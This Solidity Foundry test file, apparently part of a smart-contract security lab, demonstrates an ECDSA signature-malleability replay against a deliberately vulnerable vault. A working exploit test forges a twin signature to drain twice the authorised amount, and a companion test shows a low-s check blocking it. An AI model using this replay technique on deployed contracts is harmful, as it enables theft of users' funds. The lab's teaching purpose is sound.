// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Test} from "forge-std/Test.sol";
import {PermitVault} from "../../src/signature-replay/target/PermitVault.sol";
import {PermitVaultFixed} from "../../src/signature-replay/mitigations/PermitVaultFixed.sol";

contract SignatureReplay02Test is Test {
    PermitVault vault;
    PermitVaultFixed vaultFixed;

    uint256 constant SECP256K1_N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;

    uint256 victimKey = 0xA11CE;
    address victim;
    address attacker = makeAddr("attacker");

    function setUp() public {
        victim = vm.addr(victimKey);
        vault = new PermitVault();
        vaultFixed = new PermitVaultFixed();

        vm.deal(victim, 4 ether);
        vm.prank(victim);
        vault.deposit{value: 4 ether}();

        vm.deal(victim, 4 ether);
        vm.prank(victim);
        vaultFixed.deposit{value: 4 ether}();
    }

    /// @dev victim firma UNA autorizacion de 2 ether. El uso legitimo marca
    ///      keccak256(signature) como usado -- pero la firma gemela
    ///      (mismo r, s' = n - s, v invertido) recupera la MISMA direccion
    ///      con un hash de firma DISTINTO, así que el guard no la reconoce:
    ///      la misma autorizacion se ejecuta dos veces, 4 ether en total.
    function test_exploit_signatureMalleability() public {
        bytes32 messageHash = keccak256(abi.encodePacked(victim, uint256(2 ether), attacker));
        bytes32 ethSignedHash = vault.toEthSignedMessageHash(messageHash);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(victimKey, ethSignedHash);

        vault.withdrawWithSignature(victim, 2 ether, payable(attacker), abi.encodePacked(r, s, v));
        assertEq(vault.balances(victim), 2 ether);

        bytes32 sMalleable = bytes32(SECP256K1_N - uint256(s));
        uint8 vMalleable = v == 27 ? 28 : 27;
        bytes memory sigMalleable = abi.encodePacked(r, sMalleable, vMalleable);

        vault.withdrawWithSignature(victim, 2 ether, payable(attacker), sigMalleable);

        assertEq(vault.balances(victim), 0);
        assertEq(attacker.balance, 4 ether);
    }

    /// @dev Mismo intento contra PermitVaultFixed: la firma original de
    ///      vm.sign ya viene en forma "s baja" (s <= n/2), así que el uso
    ///      legitimo pasa igual. La gemela tiene, por construccion, la
    ///      "s alta" (s' = n - s > n/2): recoverSigner() la rechaza antes
    ///      de llegar siquiera a comprobar quien la firmo.
    function test_mitigation_blocksSignatureMalleability() public {
        bytes32 messageHash = keccak256(abi.encodePacked(victim, uint256(2 ether), attacker));
        bytes32 ethSignedHash = vaultFixed.toEthSignedMessageHash(messageHash);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(victimKey, ethSignedHash);

        vaultFixed.withdrawWithSignature(victim, 2 ether, payable(attacker), abi.encodePacked(r, s, v));
        assertEq(vaultFixed.balances(victim), 2 ether);

        bytes32 sMalleable = bytes32(SECP256K1_N - uint256(s));
        uint8 vMalleable = v == 27 ? 28 : 27;
        bytes memory sigMalleable = abi.encodePacked(r, sMalleable, vMalleable);

        vm.expectRevert(bytes("ECDSA: invalid signature 's' value"));
        vaultFixed.withdrawWithSignature(victim, 2 ether, payable(attacker), sigMalleable);
    }
}
